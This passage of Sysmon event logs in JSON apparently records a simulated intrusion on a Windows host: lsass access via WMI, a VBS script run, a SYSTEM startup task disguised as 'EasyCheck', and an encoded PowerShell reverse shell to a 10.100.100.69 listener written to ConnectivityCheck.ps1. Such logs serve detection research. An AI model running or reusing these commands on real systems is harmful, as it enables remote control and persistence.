                "time_created": "2020-05-29T19:52:48.002722"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342271",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:48.035"
                },
                "time_created": "2020-05-29T19:52:48.050312"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "11",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342272",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "11",
                    "Version": "2"
                },
                "event_data": {
                    "CreationUtcTime": "2020-05-29 19:52:48.566",
                    "Image": "C:\\WINDOWS\\SYSTEM32\\cmd.exe",
                    "ProcessGuid": "{b9db5ea0-67ef-5ed1-0000-0010ea666f00}",
                    "ProcessId": "2040",
                    "RuleName": "None",
                    "TargetFilename": "C:\\Users\\Niubbo\\Desktop\\n.vbs",
                    "UtcTime": "2020-05-29 19:52:48.566"
                },
                "time_created": "2020-05-29T19:52:48.578566"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342273",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "cscript.exe  n.vbs",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\Users\\Niubbo\\Desktop\\",
                    "Description": "Microsoft \u00ae Console Based Script Host",
                    "FileVersion": "5.812.10240.16384",
                    "Hashes": "MD5=B073F18D23BE85799A640147AF9ABA99,SHA256=4F059AC07F90E95BDAF0D7F0D1C54DDCDC0651A1E0D8AA5F03D11D6B0521177F",
                    "Image": "C:\\Windows\\System32\\cscript.exe",
                    "IntegrityLevel": "High",
                    "LogonGuid": "{b9db5ea0-5164-5ed1-0000-0020df9b0600}",
                    "LogonId": "0x0000000000069bdf",
                    "OriginalFileName": "cscript.exe",
                    "ParentCommandLine": "\"cmd.exe\"",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentProcessGuid": "{b9db5ea0-67ef-5ed1-0000-0010ea666f00}",
                    "ParentProcessId": "2040",
                    "ProcessGuid": "{b9db5ea0-6811-5ed1-0000-001003f36f00}",
                    "ProcessId": "5028",
                    "Product": "Microsoft \u00ae Windows Script Host",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 19:52:49.616"
                },
                "time_created": "2020-05-29T19:52:49.652143"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342274",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "cmd /c schtasks /ru system /create /tn \"EasyCheck\" /tr \"powershell -f C:\\Windows\\temp\\ConnectivityCheck.ps1\" /sc onstart /F",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\WINDOWS\\system32\\",
                    "Description": "Windows Command Processor",
                    "FileVersion": "10.0.18362.449 (WinBuild.160101.0800)",
                    "Hashes": "MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5",
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "IntegrityLevel": "High",
                    "LogonGuid": "{b9db5ea0-5164-5ed1-0000-0020df9b0600}",
                    "LogonId": "0x0000000000069bdf",
                    "OriginalFileName": "Cmd.Exe",
                    "ParentCommandLine": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
                    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
                    "ParentProcessGuid": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "ParentProcessId": "1404",
                    "ProcessGuid": "{b9db5ea0-6811-5ed1-0000-0010b8f86f00}",
                    "ProcessId": "8",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 19:52:49.726"
                },
                "time_created": "2020-05-29T19:52:49.759077"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342275",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "cmd /c echo powershell -w hidden -ec ZgB1AG4AYwB0AGkAbwBuACAAUgBTAEMAewBpAGYAIAAoACQAYwAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJABjAC4AQwBsAG8AcwBlACgAKQB9ADsAaQBmACAAKAAkAHAALgBFAHgAaQB0AEMAbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAkAHAALgBDAGwAbwBzAGUAKAApAH0AOwBlAHgAaQB0ADsAfQA7ACQAYQA9ACIAMQAwAC4AMQAwADAALgAxADAAMAAuADYAOQAiADsAJABwAD0AIgA4ADgAOAA4ACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHMAbwBjAGsAZQB0AHMALgB0AGMAcABjAGwAaQBlAG4AdAA7ACQAYwAuAGMAbwBuAG4AZQBjAHQAKAAkAGEALAAkAHAAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACQAbgBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AQgB5AHQAZQBbAF0AIAAkAGMALgBSAGUAYwBlAGkAdgBlAEIAdQBmAGYAZQByAFMAaQB6AGUAOwAkAHAAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBGAGkAbABlAE4AYQBtAGUAPQAiAGMAbQBkAC4AZQB4AGUAIgA7ACQAcAAuAFMAdABhAHIAdABJAG4AZgBvAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABJAG4AcAB1AHQAPQAxADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AMQA7ACQAcAAuAFMAdABhAHIAdABJAG4AZgBvAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAwADsAJABwAC4AUwB0AGEAcgB0ACgAKQA7ACQAaQBzAD0AJABwAC4AUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAA7ACQAbwBzAD0AJABwAC4AUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQA7ACQAZQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAHMAYwBpAGkARQBuAGMAbwBkAGkAbgBnADsAdwBoAGkAbABlACgAJABvAHMALgBQAGUAZQBrACgAKQAgAC0AbgBlACAALQAxACkAewAkAG8AIAArAD0AIAAkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwBzAC4AUgBlAGEAZAAoACkAKQB9ADsAJABzAC4AVwByAGkAdABlACgAJABlAC4ARwBlAHQAQgB5AHQAZQBzACgAJABvACkALAAwACwAJABvAC4ATABlAG4AZwB0AGgAKQA7ACQAbwA9ACQAbgB1AGwAbAA7ACQAZAA9ACQAZgBhAGwAcwBlADsAJAB0AD0AMAA7AHcAaABpAGwAZQAgACgALQBuAG8AdAAgACQAZAApACAAewBpAGYAIAAoACQAYwAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBuAGUAIAAkAHQAcgB1AGUAKQAgAHsAUgBTAEMAfQA7ACQAcABvAHMAPQAwADsAJABpAD0AMQA7ACAAdwBoAGkAbABlACAAKAAoACQAaQAgAC0AZwB0ACAAMAApACAALQBhAG4AZAAgACgAJABwAG8AcwAgAC0AbAB0ACAAJABuAGIALgBMAGUAbgBnAHQAaAApACkAIAB7ACQAcgA9ACQAcwAuAFIAZQBhAGQAKAAkAG4AYgAsACQAcABvAHMALAAkAG4AYgAuAEwAZQBuAGcAdABoACAALQAgACQAcABvAHMAKQA7ACQAcABvAHMAKwA9ACQAcgA7AGkAZgAgACgALQBuAG8AdAAgACQAcABvAHMAIAAtAG8AcgAgACQAcABvAHMAIAAtAGUAcQAgADAAKQAgAHsAUgBTAEMAfQA7AGkAZgAgACgAJABuAGIAWwAwAC4ALgAkACgAJABwAG8AcwAtADEAKQBdACAALQBjAG8AbgB0AGEAaQBuAHMAIAAxADAAKQAgAHsAYgByAGUAYQBrAH0AfQA7AGkAZgAgACgAJABwAG8AcwAgAC0AZwB0ACAAMAApAHsAJABzAHQAcgA9ACQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABuAGIALAAwACwAJABwAG8AcwApADsAJABpAHMALgB3AHIAaQB0AGUAKAAkAHMAdAByACkAOwBzAHQAYQByAHQALQBzAGwAZQBlAHAAIAAxADsAaQBmACAAKAAkAHAALgBFAHgAaQB0AEMAbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAUgBTAEMAfQBlAGwAcwBlAHsAJABvAD0AJABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAG8AcwAuAFIAZQBhAGQAKAApACkAOwB3AGgAaQBsAGUAKAAkAG8AcwAuAFAAZQBlAGsAKAApACAALQBuAGUAIAAtADEAKQB7ACQAbwAgACsAPQAgACQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAHMALgBSAGUAYQBkACgAKQApADsAaQBmACAAKAAkAG8AIAAtAGUAcQAgACQAcwB0AHIAKQAgAHsAJABvAD0AIgAiAH0AfQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwApACwAMAAsACQAbwAuAGwAZQBuAGcAdABoACkAOwAkAG8APQAkAG4AdQBsAGwAOwAkAHMAdAByAD0AJABuAHUAbABsAH0AfQBlAGwAcwBlAHsAUgBTAEMAfQB9ADsA > C:\\Windows\\temp\\ConnectivityCheck.ps1",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\WINDOWS\\system32\\",
                    "Description": "Windows Command Processor",
                    "FileVersion": "10.0.18362.449 (WinBuild.160101.0800)",
                    "Hashes": "MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5",
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "IntegrityLevel": "High",
                    "LogonGuid": "{b9db5ea0-5164-5ed1-0000-0020df9b0600}",
                    "LogonId": "0x0000000000069bdf",
                    "OriginalFileName": "Cmd.Exe",
                    "ParentCommandLine": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
                    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
                    "ParentProcessGuid": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "ParentProcessId": "1404",
                    "ProcessGuid": "{b9db5ea0-6811-5ed1-0000-00104bf96f00}",
                    "ProcessId": "8768",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 19:52:49.734"
                },
                "time_created": "2020-05-29T19:52:49.791452"
            }
        },
        "_type": "_doc"
    },
